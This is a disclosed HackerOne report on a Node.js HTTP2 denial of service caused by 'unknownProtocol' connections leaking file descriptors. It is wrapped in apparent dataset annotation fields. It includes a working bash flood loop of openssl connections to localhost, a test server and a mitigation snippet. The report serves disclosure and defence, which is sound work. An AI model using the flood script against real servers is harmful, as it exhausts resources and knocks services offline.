{
  "reported_to": "Node.js",
  "reported_by": "omicronenergy ",
  "title": "HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion",
  "content": "\nSummary:\nNode.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.\nDescription:\nIf an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the unknownProtocol event, then the socket is immediately closed by returning an error message.\nIf the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the unknownProtocol message, which will never come.\nTo solve this issue we registered to the unknownProtocol event and had to implement two things:\nCall socket.end() without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.\nStarting a timer and force a socket.destroy() after the timeout.\nOur current workaround for the problem looks like this:\nCode 906 Bytes\n1server.on('unknownProtocol', socket => {\n2  // Install a timeout of 10 second if the socket was\n3  // not successfully closed, then destroy the socket\n4  // to ensure that the underlying resources are released.\n5  const timer = setTimeout(() => {\n6    if (!socket.destroyed) {\n7      socket.destroy();\n8    }\n9  }, 10000);\n10  // Un-reference the timer to avoid blocking\n11  // of application shutdown and clear the timeout\n12  // if the socket was successfully closed.\n13  timer.unref();\n14\n15  // ATTENTION: Do not use the cb from the end call,\n16  // because this also causes leaks!\n17  socket.once('close', () => clearTimeout(timer));\n18\n19  // Try to gracefully close the socket\n20  // ATTENTION: The default implementation provides an error\n21  // message to the client, but if the client does not respond\n22  // this causes the graceful close to fail. Therefore the\n23  // socket is closed here without any message.\n24  socket.end();\n25});\nOnce the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.\nSteps To Reproduce:\nThe following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to 127.0.0.1 and the port is 50000. The scripts are kept as simple as possible.\nCreate a file client.sh with the content provided in the Supporting Material section below (don't start it now)\nCreate the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using createServer() if you don't have an example key or cert around.\nYou query the file descriptors with the command provided in the Supporting Material section below. Simply replace {PID} with the process id of your node server.\nMaybe you also want to watch the memory consumption with the tool you prefer.\nNow you are ready to start the client script.\nWe initially found this issue by running the Greenbone Vulnerability Manager on our server port with the OvenVAS default scanner, the Fast and ultimate configuration with all kind of vulnerability tests enabled and the TCP-SYN Service Ping alive check.\nThe affected code that causes this issue seems to be here.\nWe are running on Linux x86 with kernel v4.19.148 with node v12.19.0.\nImpact:\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.\nSupporting Material/References:\nclient.sh\nCode 154 Bytes\n1#!/bin/bash\n2\n3request=\"GET / HTTP/1.1 Host: Anything\"\n4\n5while true;\n6do\n7    echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &\n8done\nJavascript File\nCode 753 Bytes\n1const http2 = require(\"http2\");\n2const fs = require(\"fs\");\n3\n4const port = 50000;\n5\n6process.on('uncaughtException', error => {\n7  console.log('An uncaught exception occurred:', error)\n8});\n9\n10process.on('unhandledRejection', reason => {\n11  console.log('An unhandled rejection occurred:', reason)\n12});\n13\n14process.on('warning', warning => {\n15  console.log('A process warning occurred:', warning)\n16});\n17\n18function onRequest(req, res) {\n19  console.log('got request')\n20}\n21\n22const serverOptions = {\n23  key: fs.readFileSync(__dirname + \"/key.crt\"),\n24  cert: fs.readFileSync(__dirname + \"/cert.crt\")\n25};\n26\n27http2\n28  .createSecureServer(serverOptions, onRequest)\n29  .listen(port, () => {\n30    console.log(\"http2 server started on port\", port);\n31  })\n32  .on('error', (err) => console.log(err))\nQuery file descriptors command\nCode 67 Bytes\n1ls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l\nIf you need anything else let us know.\nImpact\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.\n\n",
  "severity": [
    9.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1615811100,
  "report_url": "https://hackerone.com/reports/1043360",
  "vuln_category": "CODE",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "steps": [
    [
      1,
      "Create a file 'client.sh' with the content provided in the report to simulate multiple connection attempts with an 'unknownProtocol'."
    ],
    [
      2,
      "Run the Node.js HTTP2 server example provided in the report and monitor file descriptors and memory consumption while executing 'client.sh'."
    ]
  ],
  "vuln_description": "The Node.js HTTP2 server is vulnerable to a denial of service attack when too many connection attempts with an 'unknownProtocol' are made, leading to file descriptor leaks and excessive memory usage. This can exhaust system resources, preventing new connections or operations requiring file descriptors.",
  "reason": "The attack involves a straightforward exploitation of the HTTP2 protocol's handling of unknown protocols, requiring minimal setup and no complex interactions or state manipulations. The vulnerability is triggered by simple, repetitive actions that do not require deep understanding of the application's internal logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}